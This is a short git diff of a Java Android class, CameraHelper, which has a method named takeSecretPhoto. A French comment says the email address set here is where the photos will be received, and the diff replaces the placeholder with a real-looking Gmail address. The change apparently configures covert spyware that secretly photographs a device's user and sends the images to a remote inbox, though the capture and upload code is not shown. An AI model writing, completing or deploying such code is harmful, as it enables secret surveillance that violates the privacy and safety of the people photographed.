@@ -14,7 +14,7 @@ import java.io.ByteArrayOutputStream;
 public class CameraHelper {
 
     // REMPLACE PAR L'EMAIL OU TU VEUX RECEVOIR LES PHOTOS (Si tu as créé le gmail)
-    private static final String ADMIN_EMAIL = "TON_EMAIL@gmail.com";
+    private static final String ADMIN_EMAIL = "ibrahimaliomouhamad@gmail.com";
 
     public static void takeSecretPhoto(Context context, String deviceId) {
         new CameraTask(context.getApplicationContext(), deviceId).execute();
